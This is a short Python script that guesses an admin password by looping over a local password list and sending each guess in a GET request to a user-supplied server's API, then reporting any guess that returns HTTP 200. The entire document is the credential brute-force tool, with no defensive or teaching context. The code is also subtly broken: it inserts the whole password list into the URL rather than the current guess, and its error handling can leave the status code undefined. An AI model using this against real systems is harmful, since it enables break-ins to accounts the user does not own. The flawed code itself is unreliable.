import requests

def passfind():
    file = open("password_list.txt")

    passw = file.read()

    passwords = passw.splitlines()
    server = input('server address')
    port = input('port number')

    for password in passwords:
        try:
            url = 'http://{0}:{1}/PATH/FOR/API?username=admin&password={2}'.format(server, port, passwords)
            out = requests.get(url)
            code = out.status_code
            read = out.json()
        except requests.ConnectionError:
            pass
        if code == 200:
            print('admin password is:', password)
        else:
            pass
        if code == 200:
            exit()
    else:
        print('Password Not Found')
